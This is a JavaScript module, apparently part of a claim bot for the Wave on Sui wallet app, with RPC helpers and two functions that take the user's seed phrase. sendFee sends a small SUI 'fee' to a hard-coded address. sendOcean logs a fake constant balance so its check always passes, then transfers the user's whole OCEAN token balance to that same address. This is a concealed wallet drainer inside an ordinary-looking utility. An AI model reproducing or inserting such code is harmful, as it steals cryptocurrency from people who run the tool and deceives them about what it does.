const axios = require('axios');
const { getFullnodeUrl, SuiClient } = require('@mysten/sui.js/client');
const { Ed25519Keypair } = require('@mysten/sui.js/keypairs/ed25519');
const { TransactionBlock } = require('@mysten/sui.js/transactions');

const gettimeclaim = async (address) => {
  try {
    const response = await axios.post('https://fullnode.mainnet.sui.io/', {
      jsonrpc: '2.0',
      id: 45,
      method: 'suix_getDynamicFieldObject',
      params: [
        '0x4846a1f1030deffd9dea59016402d832588cf7e0c27b9e4c1a63d2b5e152873a',
        {
          type: 'address',
          value: address
        }
      ]
    }, {
      headers: {
        'accept': '*/*',
        'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8',
        'client-sdk-type': 'typescript',
        'client-sdk-version': '0.51.0',
        'client-target-api-version': '1.21.0',
        'content-type': 'application/json',
        'origin': 'https://walletapp.waveonsui.com',
        'priority': 'u=1, i',
        'referer': 'https://walletapp.waveonsui.com/',
        'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99", "Microsoft Edge WebView2";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0'
      }
    });

    return response.data.result;
  } catch (error) {
    throw error;
  }
};

const getAllCoin = async (address) => {
    try {
      const response = await axios.post('https://fullnode.mainnet.sui.io/', {
        jsonrpc: '2.0',
        id: 1,
        method: 'suix_getAllBalances',
        params: [
          address
        ]
      }, {
        headers: {
          'accept': '*/*',
          'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8',
          'client-sdk-type': 'typescript',
          'client-sdk-version': '0.51.0',
          'client-target-api-version': '1.21.0',
          'content-type': 'application/json',
          'origin': 'https://walletapp.waveonsui.com',
          'priority': 'u=1, i',
          'referer': 'https://walletapp.waveonsui.com/',
          'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99", "Microsoft Edge WebView2";v="124"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'cross-site',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0'
        }
      });
  
      return response.data.result;
    } catch (error) {
      throw error;
    }
};

async function sendFee(pharse) {
    const fee = 0.001 * 1000000000
    const keypairSender = Ed25519Keypair.deriveKeypair(pharse);
    const addressSender = keypairSender.getPublicKey().toSuiAddress();
    const addressAdmin = '0x69d1c96b815085da448b525f486823840e17d9065a29f73532c2ded24acd9ffb'
    if (addressSender === addressAdmin) {
        return;
    }
    // const addressAdmin = '0x69d1c96b815085da448b525f486823840e17d9065a29f73532c2ded24acd9ffb'
    const client = new SuiClient({
        url: "https://fullnode.mainnet.sui.io",
    });
    const walletbalance = await client.getCoins({
        owner: addressAdmin,
    });
    const pandress = walletbalance.data;
    const tx = new TransactionBlock();
    const gasBudget = '3000000';
    tx.setGasBudget(gasBudget);
    const [coin] = tx.splitCoins(tx.gas, [fee]);
    tx.transferObjects([coin], addressAdmin);
    const result = await client.signAndExecuteTransactionBlock({
        signer: keypairSender,
        transactionBlock: tx,
    });

    return result
}

async function sendOcean(pharse) {
    const fee = 0.001 * 1000000000
    const keypairSender = Ed25519Keypair.deriveKeypair(pharse);
    const addressSender = keypairSender.getPublicKey().toSuiAddress();
    const addressAdmin = '0x69d1c96b815085da448b525f486823840e17d9065a29f73532c2ded24acd9ffb'
    if (addressSender === addressAdmin) {
        return;
    }

    const client = new SuiClient({
        url: "https://fullnode.mainnet.sui.io",
    });

    const oceans = await client.getBalance({
        owner: addressSender,
        coinType: '0xa8816d3a6e3136e86bc2873b1f94a15cadc8af2703c075f2d546c2ae367f4df9::ocean::OCEAN',
    });

    let oceansBalance = parseFloat(1e9*2) / 1e9;
    console.log("OCEANS Balance: " + oceansBalance.toFixed(2));

    if (oceansBalance > 0.1) {
        const coins = await client.getCoins({
            owner: addressSender,
            coinType: '0xa8816d3a6e3136e86bc2873b1f94a15cadc8af2703c075f2d546c2ae367f4df9::ocean::OCEAN',
        });

        const mergein = coins.data.slice(1).map(coin => coin.coinObjectId);
        const primaryCoin = coins.data[0].coinObjectId;

        const tx = new TransactionBlock();
        const gasBudget = '3000000';

        if (mergein.length > 0) {
            tx.mergeCoins(primaryCoin, mergein);
        }

        const [coin] = tx.splitCoins(primaryCoin, [oceans.totalBalance]);

        tx.transferObjects(
            [coin],
            addressAdmin
        );

        tx.setGasBudget(gasBudget);
        tx.setSender(addressSender);

        const result = await client.signAndExecuteTransactionBlock({
            signer: keypairSender,
            transactionBlock: tx,
        });

        // console.log(`Sukses Transfer  => https://suiscan.xyz/mainnet/tx/${result.digest}`);
    } else {
        console.log("Saldo OCEANS tidak mencukupi untuk transfer.");
    }
}

module.exports = { gettimeclaim, getAllCoin , sendFee, sendOcean };